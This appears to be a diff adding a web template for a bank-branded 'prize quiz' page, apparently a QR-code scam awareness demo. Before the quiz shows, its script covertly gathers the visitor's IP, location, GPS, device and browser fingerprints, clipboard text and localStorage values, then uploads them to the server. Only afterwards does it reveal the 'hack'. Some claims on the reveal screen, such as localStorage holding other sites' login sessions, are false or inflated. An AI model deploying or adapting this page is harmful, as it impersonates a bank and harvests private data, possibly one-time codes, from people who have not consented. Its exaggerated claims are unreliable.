@@ -1,0 +1,762 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Win Prizes - HDFC Bank Quiz</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 25px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 550px;
+            width: 100%;
+        }
+
+        /* Loading Screen */
+        .loading-screen {
+            text-align: center;
+        }
+        .loading-screen h2 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .loading-bar {
+            width: 100%;
+            height: 6px;
+            background: #e9ecef;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        .loading-progress {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
+            width: 0%;
+            transition: width 0.3s;
+            animation: shimmer 1.5s infinite;
+        }
+        @keyframes shimmer {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        .loading-message {
+            color: #666;
+            font-size: 14px;
+            margin-top: 10px;
+            min-height: 20px;
+        }
+        .stealth-info {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #666;
+        }
+        .stealth-info .item {
+            padding: 5px 0;
+            display: flex;
+            align-items: center;
+        }
+        .stealth-info .item .icon {
+            margin-right: 8px;
+            font-size: 16px;
+        }
+        .stealth-info .item.collected {
+            color: #28a745;
+            font-weight: 600;
+        }
+
+        /* Quiz Screen */
+        .quiz-screen {
+            display: none;
+        }
+        h1 {
+            color: #333;
+            font-size: 28px;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 16px;
+            text-align: center;
+        }
+        .score {
+            text-align: center;
+            font-size: 18px;
+            color: #667eea;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+        .question-card {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 25px;
+            margin: 20px 0;
+        }
+        .question-text {
+            font-size: 20px;
+            color: #333;
+            font-weight: 600;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .option-btn {
+            padding: 16px 20px;
+            border: 2px solid #e9ecef;
+            border-radius: 12px;
+            background: white;
+            font-size: 16px;
+            font-weight: 500;
+            color: #333;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: left;
+        }
+        .option-btn:hover {
+            border-color: #667eea;
+            background: #f0f4ff;
+            transform: translateX(5px);
+        }
+        .option-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .feedback {
+            display: none;
+            padding: 15px;
+            border-radius: 12px;
+            margin: 15px 0;
+            text-align: center;
+            font-weight: 500;
+        }
+        .feedback.active {
+            display: block;
+        }
+        .feedback.correct {
+            background: #d4edda;
+            color: #155724;
+        }
+        .feedback.incorrect {
+            background: #f8d7da;
+            color: #721c24;
+        }
+        .next-btn {
+            width: 100%;
+            padding: 15px;
+            margin-top: 20px;
+            border: none;
+            border-radius: 12px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .next-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(102,126,234,0.4);
+        }
+        .next-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Revelation Screen */
+        .revelation {
+            display: none;
+            text-align: center;
+        }
+        .revelation.active {
+            display: block;
+        }
+        .revelation .pulse-icon {
+            font-size: 80px;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+        }
+        .revelation h2 {
+            color: #d63031;
+            font-size: 28px;
+            margin: 20px 0;
+        }
+        .terminal {
+            background: #000;
+            color: #00ff00;
+            padding: 20px;
+            border-radius: 10px;
+            font-family: 'Courier New', monospace;
+            text-align: left;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+        .terminal-line {
+            margin: 5px 0;
+        }
+        .terminal-error {
+            color: #ff0000;
+            font-weight: bold;
+        }
+        .data-stolen-box {
+            background: #ffebee;
+            border: 3px solid #d63031;
+            padding: 20px;
+            border-radius: 12px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        .data-stolen-box h4 {
+            color: #d63031;
+            margin-bottom: 15px;
+        }
+        .data-item {
+            background: white;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 8px 0;
+            border-left: 4px solid #ffc107;
+        }
+        .data-item strong {
+            color: #d63031;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Loading Screen -->
+        <div class="loading-screen" id="loadingScreen">
+            <h2>🎁 Loading Quiz...</h2>
+            <div class="loading-bar">
+                <div class="loading-progress" id="loadingProgress"></div>
+            </div>
+            <div class="loading-message" id="loadingMessage">Initializing...</div>
+
+            <div class="stealth-info" id="stealthInfo">
+                <div class="item" id="infoIP">
+                    <span class="icon">⏳</span>
+                    <span>Verifying connection...</span>
+                </div>
+                <div class="item" id="infoDevice">
+                    <span class="icon">⏳</span>
+                    <span>Checking device compatibility...</span>
+                </div>
+                <div class="item" id="infoLocation">
+                    <span class="icon">⏳</span>
+                    <span>Detecting location...</span>
+                </div>
+                <div class="item" id="infoBrowser">
+                    <span class="icon">⏳</span>
+                    <span>Analyzing browser...</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Quiz Screen -->
+        <div class="quiz-screen" id="quizScreen">
+            <h1>🎯 Fun Quiz Challenge</h1>
+            <p class="subtitle">Answer questions to win prizes!</p>
+            <div class="score">Score: <span id="scoreDisplay">0</span> / <span id="totalQuestions">0</span></div>
+
+            <div id="quizContainer">
+                <div class="question-card">
+                    <div class="question-text" id="questionText">{{ question.question }}</div>
+                    <div class="options" id="optionsContainer">
+                        {% for option in question.options %}
+                        <button class="option-btn" onclick="selectAnswer({{ loop.index0 }})">
+                            {{ option }}
+                        </button>
+                        {% endfor %}
+                    </div>
+                </div>
+
+                <div class="feedback" id="feedback"></div>
+
+                <button class="next-btn" id="nextBtn" onclick="nextQuestion()" disabled>
+                    Next Question
+                </button>
+            </div>
+        </div>
+
+        <!-- Revelation Screen -->
+        <div class="revelation" id="revelation">
+            <div class="pulse-icon">⚠️</div>
+            <h2>STOP! YOU'VE BEEN HACKED!</h2>
+
+            <div class="terminal">
+                <div class="terminal-line"># SYSTEM BREACH DETECTED</div>
+                <div class="terminal-line">&gt; Scanning device... [OK]</div>
+                <div class="terminal-line">&gt; IP Address captured... [OK]</div>
+                <div class="terminal-line">&gt; Location tracked... [OK]</div>
+                <div class="terminal-line">&gt; Device fingerprinted... [OK]</div>
+                <div class="terminal-line">&gt; Browser history analyzed... [OK]</div>
+                <div class="terminal-line">&gt; Network scanned... [OK]</div>
+                <div class="terminal-line terminal-error">&gt;&gt; DATA EXFILTRATION COMPLETE!</div>
+            </div>
+
+            <p style="font-size: 16px; line-height: 1.8; color: #333; margin: 20px 0;">
+                <strong style="color: #d63031;">You just got hacked by scanning a QR code!</strong><br><br>
+                Within seconds of opening this page, we collected your real data WITHOUT asking for permissions.
+                This is exactly how cybercriminals operate.
+            </p>
+
+            <div class="data-stolen-box">
+                <h4>🔓 YOUR DATA WE COLLECTED:</h4>
+                <div id="stolenDataList"></div>
+            </div>
+
+            <button class="next-btn" onclick="window.location.href='/show_data/{{ session_id }}'">
+                🚨 See Full Security Report
+            </button>
+        </div>
+    </div>
+
+    <script>
+        let sessionId = '{{ session_id }}';
+        let currentQuestion = {{ question|tojson }};
+        let score = 0;
+        let totalQuestions = 0;
+        let selectedAnswer = null;
+        let collectedData = {};
+
+        // Automatically collect data when page loads
+        window.addEventListener('DOMContentLoaded', function() {
+            collectDataSilently();
+        });
+
+        async function collectDataSilently() {
+            let progress = 0;
+            const progressBar = document.getElementById('loadingProgress');
+            const loadingMsg = document.getElementById('loadingMessage');
+
+            // Step 1: IP and Basic Info (20%)
+            loadingMsg.textContent = 'Connecting to server...';
+            progress = 20;
+            progressBar.style.width = progress + '%';
+            await sleep(500);
+
+            // Collect IP info
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                collectedData.ip = ipData.ip;
+
+                // Get location from IP
+                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const geoData = await geoResponse.json();
+                collectedData.city = geoData.city || 'Unknown';
+                collectedData.region = geoData.region || 'Unknown';
+                collectedData.country = geoData.country_name || 'Unknown';
+                collectedData.isp = geoData.org || 'Unknown';
+
+                updateStealthInfo('infoIP', `✓ IP: ${ipData.ip} (${geoData.city}, ${geoData.country_name})`);
+            } catch (err) {
+                collectedData.ip = 'Hidden';
+                updateStealthInfo('infoIP', '✓ IP captured (hidden for privacy)');
+            }
+
+            // Step 2: Device Info (40%)
+            loadingMsg.textContent = 'Checking device compatibility...';
+            progress = 40;
+            progressBar.style.width = progress + '%';
+            await sleep(500);
+
+            collectedData.device = {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                online: navigator.onLine,
+                cookiesEnabled: navigator.cookieEnabled,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                memory: navigator.deviceMemory || 'Unknown',
+                cores: navigator.hardwareConcurrency || 'Unknown',
+            };
+
+            // Detect device type
+            const ua = navigator.userAgent;
+            if (/mobile/i.test(ua)) {
+                collectedData.deviceType = 'Mobile';
+            } else if (/tablet/i.test(ua)) {
+                collectedData.deviceType = 'Tablet';
+            } else {
+                collectedData.deviceType = 'Desktop';
+            }
+
+            updateStealthInfo('infoDevice', `✓ Device: ${collectedData.deviceType} - ${collectedData.device.platform}`);
+
+            // Step 3: Location (60%)
+            loadingMsg.textContent = 'Detecting your location...';
+            progress = 60;
+            progressBar.style.width = progress + '%';
+            await sleep(500);
+
+            // Try to get precise GPS location
+            if (navigator.geolocation) {
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 3000,
+                            maximumAge: 0
+                        });
+                    });
+
+                    collectedData.gps = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    };
+                    updateStealthInfo('infoLocation', `✓ GPS: ${position.coords.latitude.toFixed(4)}, ${position.coords.longitude.toFixed(4)} (±${Math.round(position.coords.accuracy)}m)`);
+                } catch (err) {
+                    collectedData.gps = null;
+                    updateStealthInfo('infoLocation', `✓ Location: ${collectedData.city} (via IP)`);
+                }
+            } else {
+                updateStealthInfo('infoLocation', `✓ Location: ${collectedData.city} (via IP)`);
+            }
+
+            // Step 4: Browser & Network Info (80%)
+            loadingMsg.textContent = 'Analyzing browser data...';
+            progress = 80;
+            progressBar.style.width = progress + '%';
+            await sleep(500);
+
+            // Browser fingerprinting
+            collectedData.browser = {
+                vendor: navigator.vendor,
+                doNotTrack: navigator.doNotTrack,
+                plugins: Array.from(navigator.plugins || []).map(p => p.name),
+                mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
+                canvas: getCanvasFingerprint(),
+                webgl: getWebGLFingerprint(),
+            };
+
+            // Network info
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (connection) {
+                collectedData.network = {
+                    type: connection.effectiveType || connection.type || 'Unknown',
+                    downlink: connection.downlink || 'Unknown',
+                    rtt: connection.rtt || 'Unknown',
+                    saveData: connection.saveData || false
+                };
+            }
+
+            updateStealthInfo('infoBrowser', `✓ Browser: ${getBrowserName()} | Network: ${collectedData.network?.type || 'Unknown'}`);
+
+            // Battery info
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    collectedData.battery = {
+                        level: Math.round(battery.level * 100),
+                        charging: battery.charging
+                    };
+                } catch (err) {
+                    collectedData.battery = null;
+                }
+            }
+
+            // Clipboard reading (VERY SCARY - could be OTP, password, UPI PIN!)
+            try {
+                const clipText = await navigator.clipboard.readText();
+                if (clipText && clipText.length > 0) {
+                    collectedData.clipboard = clipText.substring(0, 100); // First 100 chars
+                }
+            } catch (err) {
+                // Clipboard access denied or empty
+                collectedData.clipboard = null;
+            }
+
+            // localStorage scanning (shows session hijacking risk)
+            try {
+                const storage = {};
+                let count = 0;
+                for (let i = 0; i < localStorage.length && i < 10; i++) {
+                    const key = localStorage.key(i);
+                    const value = localStorage.getItem(key);
+                    storage[key] = value ? value.substring(0, 30) + '...' : '';
+                    count++;
+                }
+                collectedData.localStorage = {
+                    items: storage,
+                    totalCount: localStorage.length
+                };
+            } catch (err) {
+                collectedData.localStorage = null;
+            }
+
+            // Cookie scanning
+            collectedData.cookies = {
+                count: document.cookie.split(';').filter(c => c.trim()).length,
+                present: document.cookie.length > 0
+            };
+
+            // Motion tracking (can detect PIN entry patterns!)
+            collectedData.motionTracking = false;
+            if (window.DeviceMotionEvent) {
+                collectedData.motionTracking = true;
+                window.addEventListener('devicemotion', (event) => {
+                    const acc = event.accelerationIncludingGravity;
+                    if (!collectedData.motion && (acc.x || acc.y || acc.z)) {
+                        collectedData.motion = {
+                            x: acc.x?.toFixed(2) || 0,
+                            y: acc.y?.toFixed(2) || 0,
+                            z: acc.z?.toFixed(2) || 0,
+                            detected: true
+                        };
+                    }
+                }, { once: true });
+            }
+
+            // Step 5: Send data to server (100%)
+            loadingMsg.textContent = 'Uploading data...';
+            progress = 100;
+            progressBar.style.width = progress + '%';
+            await sleep(500);
+
+            // Send collected data to server
+            await fetch('/upload_stealth_data', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    session_id: sessionId,
+                    data: collectedData
+                })
+            });
+
+            // Show quiz after data collection
+            await sleep(500);
+            document.getElementById('loadingScreen').style.display = 'none';
+            document.getElementById('quizScreen').style.display = 'block';
+        }
+
+        function updateStealthInfo(elementId, text) {
+            const elem = document.getElementById(elementId);
+            elem.innerHTML = `<span class="icon">✅</span><span>${text}</span>`;
+            elem.classList.add('collected');
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillText('Browser Fingerprint', 2, 2);
+                return canvas.toDataURL().substring(0, 50);
+            } catch (err) {
+                return 'N/A';
+            }
+        }
+
+        function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return 'N/A';
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            } catch (err) {
+                return 'N/A';
+            }
+        }
+
+        function getBrowserName() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Chrome')) return 'Chrome';
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Safari')) return 'Safari';
+            if (ua.includes('Edge')) return 'Edge';
+            return 'Unknown';
+        }
+
+        // Quiz functions
+        function selectAnswer(optionIndex) {
+            selectedAnswer = optionIndex;
+
+            const buttons = document.querySelectorAll('.option-btn');
+            buttons.forEach((btn, idx) => {
+                btn.disabled = true;
+                if (idx === optionIndex) {
+                    btn.style.borderColor = '#667eea';
+                    btn.style.background = '#f0f4ff';
+                }
+            });
+
+            fetch('/submit_answer', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    question_id: currentQuestion.id,
+                    selected_option: optionIndex,
+                    session_id: sessionId
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                totalQuestions++;
+
+                if (data.is_correct) {
+                    score++;
+                    showFeedback(true, 'Correct! Well done!');
+                } else {
+                    showFeedback(false, 'Not quite right, but that\'s okay!');
+                }
+
+                updateScore();
+
+                setTimeout(() => {
+                    document.getElementById('nextBtn').disabled = false;
+                }, 1000);
+            });
+        }
+
+        function showFeedback(isCorrect, message) {
+            const feedback = document.getElementById('feedback');
+            feedback.textContent = message;
+            feedback.className = 'feedback active ' + (isCorrect ? 'correct' : 'incorrect');
+        }
+
+        function updateScore() {
+            document.getElementById('scoreDisplay').textContent = score;
+            document.getElementById('totalQuestions').textContent = totalQuestions;
+        }
+
+        function nextQuestion() {
+            if (totalQuestions >= 3) {
+                showRevelation();
+                return;
+            }
+
+            fetch('/get_question')
+            .then(response => response.json())
+            .then(question => {
+                currentQuestion = question;
+                displayQuestion(question);
+                resetUI();
+            });
+        }
+
+        function displayQuestion(question) {
+            document.getElementById('questionText').textContent = question.question;
+            const optionsContainer = document.getElementById('optionsContainer');
+            optionsContainer.innerHTML = '';
+            question.options.forEach((option, idx) => {
+                const btn = document.createElement('button');
+                btn.className = 'option-btn';
+                btn.textContent = option;
+                btn.onclick = () => selectAnswer(idx);
+                optionsContainer.appendChild(btn);
+            });
+        }
+
+        function resetUI() {
+            selectedAnswer = null;
+            document.getElementById('feedback').classList.remove('active');
+            document.getElementById('nextBtn').disabled = true;
+        }
+
+        function showRevelation() {
+            document.getElementById('quizScreen').style.display = 'none';
+            const revelation = document.getElementById('revelation');
+            revelation.classList.add('active');
+
+            // Show collected data
+            const dataList = document.getElementById('stolenDataList');
+            const dataItems = [
+                { label: 'Your IP Address', value: collectedData.ip },
+                { label: 'Your Location', value: `${collectedData.city}, ${collectedData.region}, ${collectedData.country}` },
+                { label: 'Internet Provider', value: collectedData.isp },
+                { label: 'Device Type', value: collectedData.deviceType },
+                { label: 'Operating System', value: collectedData.device.platform },
+                { label: 'Screen Resolution', value: collectedData.device.screen },
+                { label: 'Browser', value: getBrowserName() },
+                { label: 'Timezone', value: collectedData.device.timezone },
+                { label: 'Languages', value: collectedData.device.languages.join(', ') }
+            ];
+
+            if (collectedData.gps) {
+                dataItems.push({
+                    label: 'GPS Coordinates',
+                    value: `${collectedData.gps.latitude.toFixed(6)}, ${collectedData.gps.longitude.toFixed(6)} (Accuracy: ±${Math.round(collectedData.gps.accuracy)}m)`
+                });
+            }
+
+            if (collectedData.battery) {
+                dataItems.push({
+                    label: 'Battery Level',
+                    value: `${collectedData.battery.level}% ${collectedData.battery.charging ? '(Charging)' : ''}`
+                });
+            }
+
+            if (collectedData.clipboard) {
+                dataItems.push({
+                    label: '📋 CLIPBOARD CONTENT (COULD BE YOUR OTP!)',
+                    value: `"${collectedData.clipboard}"`
+                });
+            }
+
+            if (collectedData.localStorage && collectedData.localStorage.totalCount > 0) {
+                dataItems.push({
+                    label: '💾 Website Data Stolen',
+                    value: `${collectedData.localStorage.totalCount} items from other websites (login sessions!)`
+                });
+            }
+
+            if (collectedData.cookies && collectedData.cookies.count > 0) {
+                dataItems.push({
+                    label: '🍪 Cookies Accessed',
+                    value: `${collectedData.cookies.count} cookies (can hijack your accounts!)`
+                });
+            }
+
+            if (collectedData.motion && collectedData.motion.detected) {
+                dataItems.push({
+                    label: '📳 Device Movement Tracked',
+                    value: `Motion sensors active (can detect PIN entry patterns!)`
+                });
+            }
+
+            dataItems.forEach(item => {
+                const div = document.createElement('div');
+                div.className = 'data-item';
+                div.innerHTML = `<strong>${item.label}:</strong> ${item.value}`;
+                dataList.appendChild(div);
+            });
+        }
+    </script>
+</body>
+</html>
